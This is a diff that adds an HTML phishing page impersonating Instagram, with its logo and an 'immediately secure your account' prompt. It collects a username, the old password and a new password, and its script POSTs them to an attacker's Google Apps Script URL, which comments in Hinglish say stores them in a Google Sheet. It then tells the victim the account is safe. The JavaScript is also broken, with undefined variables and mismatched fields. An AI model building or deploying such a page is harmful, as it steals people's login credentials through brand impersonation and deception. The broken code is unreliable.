@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>User Details </title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    background: #f2f4f7;
+    color: #20242e;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: #ffffff;
+    width: 100%;
+    max-width: 440px;
+    border: 1px solid #dde2ea;
+    border-radius: 12px;
+    padding: 32px 28px;
+    box-shadow: 0 4px 18px rgba(21, 29, 46, 0.08);
+  }
+  .brand { text-align: center; margin-bottom: 20px; }
+  .brand .logo { width: 56px; height: 56px; }
+  h1 { font-size: 22px; font-weight: 600; color: #151d2e; margin: 10px 0 6px; }
+  .sub { font-size: 13px; color: #5a6376; margin-bottom: 24px; }
+  label { display: block; font-size: 13px; font-weight: 600; color: #1b1d36; margin-bottom: 6px; }
+  input {
+    width: 100%;
+    padding: 11px 12px;
+    font-size: 14px;
+    border: 1px solid #c6cdd8;
+    border-radius: 8px;
+    margin-bottom: 16px;
+    outline: none;
+    background: #ffffff;
+    color: #20242e;
+  }
+  input:focus { border-color: #1f4e79; box-shadow: 0 0 0 3px rgba(31, 78, 121, 0.15); }
+  .mobile-wrap { display: flex; gap: 8px; }
+  .mobile-wrap .code {
+    width: 64px; text-align: center; background: #eef1f5; color: #3c4356; font-weight: 600;
+  }
+  .mobile-wrap input[type="tel"] { flex: 1; }
+  button {
+    width: 100%;
+    padding: 12px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #ffffff;
+    background: #1f4e79;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+  }
+  button:hover { background: #173d5f; }
+  button:disabled { background: #8fa6bb; cursor: wait; }
+  .error {
+    display: none;
+    background: #fdecec;
+    color: #9c2222;
+    border: 1px solid #f3c2c2;
+    font-size: 13px;
+    padding: 10px 12px;
+    border-radius: 8px;
+    margin-bottom: 16px;
+  }
+  /* Confirmation view */
+  .confirm { text-align: center; padding: 16px 0 8px; }
+  .confirm .tick {
+    width: 64px; height: 64px; margin: 0 auto 18px;
+    border-radius: 50%;
+    background: #e7f4ec;
+    color: #1e7a3c;
+    font-size: 32px; line-height: 64px;
+  }
+  .confirm h2 { font-size: 20px; color: #151d2e; margin-bottom: 8px; }
+  .confirm p { font-size: 14px; color: #5a6376; margin-bottom: 22px; }
+  .hidden { display: none; }
+</style>
+</head>
+<body>
+
+  <!-- ============ FORM VIEW ============ -->
+  <div class="card" id="formView">
+    <div class="brand">
+      <!-- Logo: ye ek simple sa nishan hai. Apna logo lagana ho to
+           is <svg> ki jagah <img src="logo.png"> daal dena. -->
+      <svg class="logo" viewBox="0 0 24 24" width="64" height="64" fill="none" stroke="#1f4e79" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+</svg>
+      <h1>Welcome to instagram </h1>
+    </div>
+    <p class="sub">secure your account immediatly</p>
+
+    <div class="error" id="errorBox"></div>
+
+    <form id="detailsForm" novalidate>
+      <label for="username">Username</label>
+      <input type="text" id="username" placeholder="Enter your username" autocomplete="off">
+
+      <label for="password">old password</label>
+      <div class="mobile-wrap">
+        <input type="text" class="code" value="" readonly tabindex="-1">
+        <input type="tel" id="password" placeholder="old password" maxlength="25" inputmode="numeric">
+      </div>
+
+      <label for="password">new password</label>
+      <input type="email" id="email" placeholder="Enter your email address" autocomplete="off">
+
+      <button type="submit" id="submitBtn">Submit</button>
+    </form>
+  </div>
+
+  <!-- ============ CONFIRMATION VIEW ============ -->
+  <div class="card hidden" id="confirmView">
+    <div class="confirm">
+      <div class="tick">&#10003;</div>
+      <h2>safe &mdash; now your account is safe .</h2>
+      <p>your account is safe now.</p>
+      <button type="button" id="againBtn">back to home screen</button>
+    </div>
+  </div>
+
+<script>
+  // ============================================================
+  //  IMPORTANT: Code.gs ko deploy karne ke baad jo Web App URL
+  //  milega, wo neeche is line me daalna hai:
+  // ============================================================
+  var SCRIPT_URL = "YAHAN_APNA_APPS_SCRIPT_URL_DAALO";
+
+  var form      = document.getElementById("detailsForm");
+  var errorBox  = document.getElementById("errorBox");
+  var submitBtn = document.getElementById("submitBtn");
+  var formView  = document.getElementById("formView");
+  var confirmView = document.getElementById("confirmView");
+
+  function showError(msg) {
+    errorBox.textContent = msg;
+    errorBox.style.display = "block";
+  }
+  function hideError() { errorBox.style.display = "none"; }
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+    hideError();
+
+    var username = document.getElementById("username").value.trim();
+    var password  = document.getElementById("password").value.trim();
+    var password    = document.getElementById("password").value.trim();
+
+    // ---- Validation ----
+    if (username.length < 3) {
+      showError("Please enter a valid username (at least 3 characters).");
+      return;
+    }if (mobile.length === 0) {
+  showError("Please enter your mobile number.");
+  return;
+
+    }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      showError("Please enter a valid email address.");
+      return;
+    }
+    if (SCRIPT_URL === "YAHAN_APNA_APPS_SCRIPT_URL_DAALO") {
+      showError("Setup pending: pehle Code.gs deploy karke uska URL is file me daalo.");
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Submitting...";
+
+    // ---- Data Google Sheet ko bhejna ----
+    var data = new FormData();
+    data.append("username", username);
+    data.append("password", old);
+    data.append("password", new password);
+
+    fetch(SCRIPT_URL, { method: "POST", body: data })
+      .then(function () {
+        // Save ho gaya -> confirmation page dikhao
+        formView.classList.add("hidden");
+        confirmView.classList.remove("hidden");
+      })
+      .catch(function () {
+        showError("Something went wrong. Please check your internet and try again.");
+      })
+      .finally(function () {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Submit";
+      });
+  });
+
+  document.getElementById("againBtn").addEventListener("click", function () {
+    form.reset();
+    confirmView.classList.add("hidden");
+    formView.classList.remove("hidden");
+  });
+</script>
+
+</body>
+</html>
